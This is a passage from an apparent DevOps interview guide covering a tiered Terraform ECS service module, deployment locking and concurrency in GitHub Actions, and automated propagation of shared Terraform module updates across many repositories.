    condition     = contains(["development", "standard", "critical"], var.tier)
    error_message = "Tier must be: development, standard, or critical."
  }
}

variable "container_image" {
  type = string
}

variable "container_port" {
  type    = number
  default = 8080
}

# Allow overriding tier defaults (escape hatch)
variable "desired_count" {
  type    = number
  default = null  # null = use tier default
}

variable "enable_autoscaling" {
  type    = bool
  default = null  # null = use tier default
}

variable "enable_circuit_breaker" {
  type    = bool
  default = null  # null = use tier default
}
```

```hcl
# modules/ecs-service/locals.tf

locals {
  # Tier-based defaults (opinionated but overridable)
  tier_configs = {
    development = {
      desired_count          = 1
      min_capacity           = 1
      max_capacity           = 2
      cpu                    = 256
      memory                 = 512
      enable_autoscaling     = false
      enable_circuit_breaker = false
      health_check_grace     = 30
      deployment_min_pct     = 0    # Allow 0 healthy during deploy (fast)
      deployment_max_pct     = 200
      log_retention_days     = 7
      alarm_actions          = []
      assign_public_ip       = true  # Dev convenience
      deletion_protection    = false
    }
    standard = {
      desired_count          = 2
      min_capacity           = 2
      max_capacity           = 10
      cpu                    = 512
      memory                 = 1024
      enable_autoscaling     = true
      enable_circuit_breaker = true
      health_check_grace     = 120
      deployment_min_pct     = 100  # Never go below desired
      deployment_max_pct     = 200
      log_retention_days     = 30
      alarm_actions          = [var.ops_sns_topic_arn]
      assign_public_ip       = false
      deletion_protection    = false
    }
    critical = {
      desired_count          = 4
      min_capacity           = 4
      max_capacity           = 20
      cpu                    = 1024
      memory                 = 2048
      enable_autoscaling     = true
      enable_circuit_breaker = true
      health_check_grace     = 180
      deployment_min_pct     = 100
      deployment_max_pct     = 200
      log_retention_days     = 90
      alarm_actions          = [var.pagerduty_sns_topic_arn]
      assign_public_ip       = false
      deletion_protection    = true
    }
  }
  
  # Merge tier defaults with explicit overrides
  config = local.tier_configs[var.tier]
  
  # Allow variable overrides to take precedence over tier defaults
  effective = {
    desired_count          = coalesce(var.desired_count, local.config.desired_count)
    enable_autoscaling     = coalesce(var.enable_autoscaling, local.config.enable_autoscaling)
    enable_circuit_breaker = coalesce(var.enable_circuit_breaker, local.config.enable_circuit_breaker)
    cpu                    = coalesce(var.cpu, local.config.cpu)
    memory                 = coalesce(var.memory, local.config.memory)
    min_capacity           = coalesce(var.min_capacity, local.config.min_capacity)
    max_capacity           = coalesce(var.max_capacity, local.config.max_capacity)
  }
}
```

```hcl
# modules/ecs-service/main.tf

resource "aws_ecs_service" "main" {
  name            = var.service_name
  cluster         = var.cluster_id
  task_definition = aws_ecs_task_definition.main.arn
  desired_count   = local.effective.desired_count
  launch_type     = "FARGATE"
  
  deployment_configuration {
    minimum_healthy_percent = local.config.deployment_min_pct
    maximum_percent         = local.config.deployment_max_pct
    
    # Circuit breaker: only for standard/critical
    dynamic "deployment_circuit_breaker" {
      for_each = local.effective.enable_circuit_breaker ? [1] : []
      content {
        enable   = true
        rollback = true
      }
    }
  }
  
  health_check_grace_period_seconds = local.config.health_check_grace
  
  network_configuration {
    subnets          = var.subnet_ids
    security_groups  = [aws_security_group.service.id]
    assign_public_ip = local.config.assign_public_ip
  }
  
  # Load balancer: only if ALB provided
  dynamic "load_balancer" {
    for_each = var.target_group_arn != null ? [1] : []
    content {
      target_group_arn = var.target_group_arn
      container_name   = var.service_name
      container_port   = var.container_port
    }
  }
  
  # Spread across AZs (critical/standard only)
  dynamic "ordered_placement_strategy" {
    for_each = var.tier != "development" ? [1] : []
    content {
      type  = "spread"
      field = "attribute:ecs.availability-zone"
    }
  }
  
  lifecycle {
    ignore_changes = local.effective.enable_autoscaling ? [desired_count] : []
  }
}

# Auto-scaling: only for standard/critical tiers
resource "aws_appautoscaling_target" "main" {
  count = local.effective.enable_autoscaling ? 1 : 0
  
  max_capacity       = local.effective.max_capacity
  min_capacity       = local.effective.min_capacity
  resource_id        = "service/${var.cluster_name}/${aws_ecs_service.main.name}"
  scalable_dimension = "ecs:service:DesiredCount"
  service_namespace  = "ecs"
}

resource "aws_appautoscaling_policy" "cpu" {
  count = local.effective.enable_autoscaling ? 1 : 0
  
  name               = "${var.service_name}-cpu-scaling"
  resource_id        = aws_appautoscaling_target.main[0].resource_id
  scalable_dimension = aws_appautoscaling_target.main[0].scalable_dimension
  service_namespace  = aws_appautoscaling_target.main[0].service_namespace
  policy_type        = "TargetTrackingScaling"
  
  target_tracking_scaling_policy_configuration {
    predefined_metric_specification {
      predefined_metric_type = "ECSServiceAverageCPUUtilization"
    }
    target_value       = 70
    scale_in_cooldown  = 300
    scale_out_cooldown = 60
  }
}

# Monitoring: tier-appropriate alarms
resource "aws_cloudwatch_metric_alarm" "high_cpu" {
  count = var.tier != "development" ? 1 : 0
  
  alarm_name          = "${var.service_name}-cpu-high"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = var.tier == "critical" ? 2 : 5
  metric_name         = "CPUUtilization"
  namespace           = "AWS/ECS"
  period              = 60
  statistic           = "Average"
  threshold           = var.tier == "critical" ? 70 : 85
  
  dimensions = {
    ClusterName = var.cluster_name
    ServiceName = var.service_name
  }
  
  alarm_actions = local.config.alarm_actions
}
```

**Usage Examples:**

```hcl
# Development (minimal, fast deploys)
module "api_dev" {
  source = "../modules/ecs-service"
  
  service_name    = "payment-api"
  tier            = "development"
  container_image = "123456789.dkr.ecr.us-east-1.amazonaws.com/payment-api:dev-latest"
  cluster_id      = module.dev_cluster.id
  subnet_ids      = module.dev_vpc.public_subnet_ids
}

# Production (full HA, monitoring, circuit breaker)
module "api_prod" {
  source = "../modules/ecs-service"
  
  service_name    = "payment-api"
  tier            = "critical"
  container_image = "123456789.dkr.ecr.us-east-1.amazonaws.com/payment-api:v2.3.1"
  cluster_id      = module.prod_cluster.id
  subnet_ids      = module.prod_vpc.private_subnet_ids
  
  # Override specific defaults if needed:
  desired_count = 6  # More than critical default of 4
}
```

---

### Q9: Your team uses GitHub Actions for CI/CD. A workflow run failed because a previous run's deployment is still in progress and the two conflict. How do you implement proper deployment locking and concurrency control?

**Answer:**

**The Problem:**

```
Timeline:
T=0:  Developer A pushes to main → Workflow Run #1 starts → Deploy begins
T=2:  Developer B pushes to main → Workflow Run #2 starts → Deploy begins
T=3:  Run #1 deploy at 50% → Run #2 tries to deploy DIFFERENT version
T=4:  ECS has tasks from BOTH versions → Inconsistent state
T=5:  Health checks fail → Both deployments roll back → Outage
```

**Solution 1: GitHub Actions Concurrency (Built-in)**

```yaml
name: Deploy
on:
  push:
    branches: [main]

# CRITICAL: Only one deployment at a time
concurrency:
  group: deploy-production  # All runs share this lock
  cancel-in-progress: false  # DON'T cancel running deploy!
  # false = queue new run until current finishes
  # true = cancel current run (dangerous for deploys!)
```

**Solution 2: Environment-Level Concurrency**

```yaml
jobs:
  deploy-staging:
    environment: staging
    concurrency:
      group: staging-deploy
      cancel-in-progress: true  # OK to cancel staging deploys
    steps:
      - run: ./deploy.sh staging

  deploy-production:
    needs: deploy-staging
    environment: production  # Has manual approval gate
    concurrency:
      group: production-deploy
      cancel-in-progress: false  # NEVER cancel production deploys
    steps:
      - run: ./deploy.sh production
```

**Solution 3: DynamoDB-Based Distributed Lock (Cross-Workflow)**

```yaml
# For complex scenarios where multiple workflows/repos deploy to same target
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Acquire deployment lock
        id: lock
        run: |
          LOCK_ID="deploy-production-payment-api"
          LEASE_DURATION=900  # 15 minutes max
          
          # Try to acquire lock (DynamoDB conditional write)
          RESULT=$(aws dynamodb put-item \
            --table-name deployment-locks \
            --item '{
              "lock_id": {"S": "'$LOCK_ID'"},
              "owner": {"S": "github-run-${{ github.run_id }}"},
              "acquired_at": {"N": "'$(date +%s)'"},
              "expires_at": {"N": "'$(($(date +%s) + $LEASE_DURATION))'"}
            }' \
            --condition-expression "attribute_not_exists(lock_id) OR expires_at < :now" \
            --expression-attribute-values '{":now": {"N": "'$(date +%s)'"}}' \
            2>&1) || true
          
          if echo "$RESULT" | grep -q "ConditionalCheckFailedException"; then
            echo "❌ Deployment lock held by another run. Queuing..."
            # Wait and retry (up to 10 minutes)
            for i in $(seq 1 20); do
              sleep 30
              # Try again...
              RESULT=$(aws dynamodb put-item ... 2>&1) || true
              if ! echo "$RESULT" | grep -q "ConditionalCheckFailed"; then
                echo "✅ Lock acquired after waiting"
                break
              fi
              echo "⏳ Still waiting... ($i/20)"
            done
          fi
          
          echo "lock_acquired=true" >> $GITHUB_OUTPUT
      
      - name: Deploy
        if: steps.lock.outputs.lock_acquired == 'true'
        run: ./deploy.sh production
      
      - name: Release deployment lock
        if: always()  # Release even on failure
        run: |
          aws dynamodb delete-item \
            --table-name deployment-locks \
            --key '{"lock_id": {"S": "deploy-production-payment-api"}}' \
            --condition-expression "owner = :me" \
            --expression-attribute-values '{":me": {"S": "github-run-${{ github.run_id }}"}}'
```

**Solution 4: Queue-Based Deployments (Most Robust)**

```yaml
# Instead of deploying directly, enqueue the deployment
# A separate controller processes the queue serially

jobs:
  enqueue-deployment:
    runs-on: ubuntu-latest
    steps:
      - name: Submit deployment request
        run: |
          aws sqs send-message \
            --queue-url $DEPLOY_QUEUE_URL \
            --message-body '{
              "service": "payment-api",
              "version": "${{ github.sha }}",
              "environment": "production",
              "requester": "${{ github.actor }}",
              "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
            }' \
            --message-group-id "payment-api-production"
            # FIFO queue: guarantees ordering per service
      
      - name: Wait for deployment completion
        run: |
          # Poll DynamoDB for deployment status
          TIMEOUT=600
          START=$(date +%s)
          while true; do
            STATUS=$(aws dynamodb get-item \
              --table-name deployments \
              --key '{"deployment_id": {"S": "${{ github.sha }}"}}' \
              --query 'Item.status.S' --output text)
            
            if [ "$STATUS" = "COMPLETED" ]; then
              echo "✅ Deployment successful"
              exit 0
            elif [ "$STATUS" = "FAILED" ]; then
              echo "❌ Deployment failed"
              exit 1
            fi
            
            ELAPSED=$(($(date +%s) - $START))
            if [ $ELAPSED -gt $TIMEOUT ]; then
              echo "⏰ Timeout waiting for deployment"
              exit 1
            fi
            
            sleep 10
          done
```

**Solution 5: GitHub Deployment API (Native)**

```yaml
# Use GitHub's Deployment API for tracking
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Create deployment
        id: deployment
        uses: actions/github-script@v7
        with:
          script: |
            const deployment = await github.rest.repos.createDeployment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              ref: context.sha,
              environment: 'production',
              required_contexts: [],  // Skip status checks (already passed)
              auto_merge: false,
              transient_environment: false
            });
            return deployment.data.id;
      
      - name: Deploy
        run: ./deploy.sh production
      
      - name: Update deployment status
        if: always()
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.repos.createDeploymentStatus({
              owner: context.repo.owner,
              repo: context.repo.repo,
              deployment_id: ${{ steps.deployment.outputs.result }},
              state: '${{ job.status }}' === 'success' ? 'success' : 'failure',
              environment_url: 'https://api.production.company.com'
            });
```

---

### Q10: Your organization has 50 microservices, each with their own Terraform code and GitHub Actions pipeline. When a shared module changes, you need to update all 50 services. This takes weeks of PRs. How do you automate this at scale?

**Answer:**

**Architecture: Centralized Module + Automated Propagation**

```
┌─────────────────────────────────────────────────────────────────┐
│  Module Update Propagation System                                │
│                                                                   │
│  1. Module repo: shared module updated + tagged                  │
│  2. Webhook triggers propagation pipeline                        │
│  3. Pipeline creates PRs in all 50 consuming repos              │
│  4. PRs auto-tested via CI                                       │
│  5. Auto-merge if tests pass (or notify team for review)         │
└─────────────────────────────────────────────────────────────────┘
```

**Implementation: Renovate Bot (Best for Terraform Modules)**

```json
// renovate.json in each service repo
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "terraform": {
    "enabled": true
  },
  "regexManagers": [
    {
      "fileMatch": [".*\\.tf$"],
      "matchStrings": [
        "source\\s*=\\s*\"git::https://github.com/myorg/terraform-modules.git//(?<depName>[^?]+)\\?ref=(?<currentValue>[^\"]+)\""
      ],
      "datasourceTemplate": "github-tags",
      "packageNameTemplate": "myorg/terraform-modules",
      "versioningTemplate": "semver"
    }
  ],
  "packageRules": [
    {
      "matchPackageNames": ["myorg/terraform-modules"],
      "automerge": true,
      "automergeType": "pr",
      "requiredStatusChecks": ["terraform-plan", "security-scan"],
      "schedule": ["every weekday"]
    }
  ]
}
```

**Custom Propagation Pipeline (For Full Control):**

```yaml
# .github/workflows/propagate-module-update.yml
# Runs in the MODULES repo when a new version is tagged
name: Propagate Module Update
on:
  push:
    tags: ['v*']

jobs:
  find-consumers:
    runs-on: ubuntu-latest
    outputs:
      repos: ${{ steps.search.outputs.repos }}
    steps:
      - name: Find all repos using this module
        id: search
        run: |
          # Search GitHub for repos referencing our module
          REPOS=$(gh api search/code \
            -f q="org:myorg terraform-modules in:file extension:tf" \
            --jq '.items[].repository.full_name' | sort -u | jq -R -s 'split("\n")[:-1]')
          echo "repos=$REPOS" >> $GITHUB_OUTPUT
  
  create-update-prs:
    needs: find-consumers
    runs-on: ubuntu-latest
    strategy:
      matrix:
        repo: ${{ fromJson(needs.find-consumers.outputs.repos) }}
      max-parallel: 10  # Don't overwhelm GitHub API
    steps:
      - name: Checkout consumer repo
        uses: actions/checkout@v4
        with:
          repository: ${{ matrix.repo }}
          token: ${{ secrets.ORG_PAT }}
      
      - name: Update module references
        run: |
          NEW_VERSION="${{ github.ref_name }}"
          
          # Find and update all .tf files referencing our module
          find . -name "*.tf" -exec grep -l "terraform-modules" {} \; | while read file; do
            sed -i "s|terraform-modules.git//\([^?]*\)?ref=v[0-9]*\.[0-9]*\.[0-9]*|terraform-modules.git//\1?ref=${NEW_VERSION}|g" "$file"
          done
          
          # Check if anything changed
          if git diff --quiet; then
            echo "No changes needed for ${{ matrix.repo }}"
            exit 0
          fi
      
      - name: Create PR
        run: |
          BRANCH="auto/update-modules-${{ github.ref_name }}"
          git checkout -b "$BRANCH"
          git add -A
          git commit -m "chore: update shared modules to ${{ github.ref_name }}

          Automated update of terraform-modules to ${{ github.ref_name }}.
          
          Changes in this version:
          $(gh api repos/myorg/terraform-modules/releases/tags/${{ github.ref_name }} --jq '.body')"
          
          git push origin "$BRANCH"
          
          gh pr create \
            --repo "${{ matrix.repo }}" \
            --title "chore: update terraform modules to ${{ github.ref_name }}" \
            --body "## Automated Module Update
            
          This PR updates shared Terraform modules to \`${{ github.ref_name }}\`.
          
          **Auto-merge:** This PR will auto-merge if CI passes.
          **If CI fails:** Please review the breaking changes and update your code.
          
          [Release Notes](https://github.com/myorg/terraform-modules/releases/tag/${{ github.ref_name }})" \
            --label "automated,dependencies"
```

**Terraform Lock File (.terraform.lock.hcl) for Reproducibility:**

```hcl
# .terraform.lock.hcl is auto-generated and ensures exact provider versions
# Commit this file! It prevents "works on my machine" issues

provider "registry.terraform.io/hashicorp/aws" {
  version     = "5.31.0"
  constraints = "~> 5.31"
  hashes = [
    "h1:abc123...",
    "zh:def456...",
  ]
}
```

**Dependency Dashboard (Visibility):**

```python
# Script to generate module dependency report
import subprocess
import json

def generate_dependency_report():
    """Show which repos use which module versions."""
    
    repos = get_all_terraform_repos()
    report = {}
    
    for repo in repos:
        modules = extract_module_versions(repo)
        for module_name, version in modules.items():
            if module_name not in report:
                report[module_name] = {}
            if version not in report[module_name]:
                report[module_name][version] = []
            report[module_name][version].append(repo)
    
    # Output:
    # vpc module:
    #   v3.2.1: [repo-a, repo-b, repo-c] (latest ✅)
    #   v3.1.0: [repo-d, repo-e] (1 version behind ⚠️)
    #   v2.5.0: [repo-f] (major version behind 🔴)
    
    return report
```
